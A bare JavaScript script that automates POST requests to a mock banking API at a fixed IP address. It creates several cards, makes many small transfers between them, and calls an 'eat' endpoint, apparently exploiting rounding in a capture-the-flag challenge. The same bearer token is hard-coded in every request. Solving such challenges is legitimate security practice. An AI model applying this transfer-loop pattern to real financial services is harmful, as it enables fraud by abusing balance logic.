async function tran(i, j, c) {
    return fetch("http://202.38.93.111:10100/api/transfer", {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "zh-CN,zh;q=0.9",
        authorization:
          "Bearer 1716:MEUCIAj3vUnhyiI2u58LzU4HZehjHjIKg+dco+tBBcoLLYV0AiEAi60mhNWJbHPboMIOnoGVm0EfBVDSbKygjKl+TMTS1rM=",
        "cache-control": "no-cache",
        "content-type": "application/json;charset=UTF-8",
        pragma: "no-cache",
      },
      referrer: "http://202.38.93.111:10100/",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: '{"src":' + i + ',"dst":' + j + ',"amount":' + c + "}",
      method: "POST",
      mode: "cors",
      credentials: "include",
    });
  }
  async function gao(n) {
    // new card
    for (let i = 1; i <= 12; i++)
      await fetch("http://202.38.93.111:10100/api/create", {
        headers: {
          accept: "application/json, text/plain, */*",
          "accept-language": "zh-CN,zh;q=0.9",
          authorization:
            "Bearer 1716:MEUCIAj3vUnhyiI2u58LzU4HZehjHjIKg+dco+tBBcoLLYV0AiEAi60mhNWJbHPboMIOnoGVm0EfBVDSbKygjKl+TMTS1rM=",
          "cache-control": "no-cache",
          "content-type": "application/json;charset=UTF-8",
          pragma: "no-cache",
        },
        referrer: "http://202.38.93.111:10100/",
        referrerPolicy: "strict-origin-when-cross-origin",
        body: '{"type":"debit"}',
        method: "POST",
        mode: "cors",
        credentials: "include",
      });

    await fetch("http://202.38.93.111:10100/api/create", {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "zh-CN,zh;q=0.9",
        authorization:
          "Bearer 1716:MEUCIAj3vUnhyiI2u58LzU4HZehjHjIKg+dco+tBBcoLLYV0AiEAi60mhNWJbHPboMIOnoGVm0EfBVDSbKygjKl+TMTS1rM=",
        "cache-control": "no-cache",
        "content-type": "application/json;charset=UTF-8",
        pragma: "no-cache",
      },
      referrer: "http://202.38.93.111:10100/",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: '{"type":"credit"}',
      method: "POST",
      mode: "cors",
      credentials: "include",
    });

    const offset = (n - 1) * (12 + 1) + 1;
    await tran(offset + 13, 1, 2099);
    for (let i = 1; i <= 12; i++) {
      await tran(1, offset + i, 167);
    }

    await fetch("http://202.38.93.111:10100/api/eat", {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "zh-CN,zh;q=0.9",
        authorization:
          "Bearer 1716:MEUCIAj3vUnhyiI2u58LzU4HZehjHjIKg+dco+tBBcoLLYV0AiEAi60mhNWJbHPboMIOnoGVm0EfBVDSbKygjKl+TMTS1rM=",
        "cache-control": "no-cache",
        "content-type": "application/json;charset=UTF-8",
        pragma: "no-cache",
      },
      referrer: "http://202.38.93.111:10100/",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: '{"account":1}',
      method: "POST",
      mode: "cors",
      credentials: "include",
    });

    for (let old_offset = 1; old_offset <= offset; old_offset += 13) {
      for (let i = 1; i <= 12; i++) {
        await tran(old_offset + i, 1, 1);
        console.log(old_offset + i, 1, 1);
      }
      await tran(1, old_offset + 13, 10);
      console.log(1, old_offset + 13, 10);
    }

    console.log("end");
  }
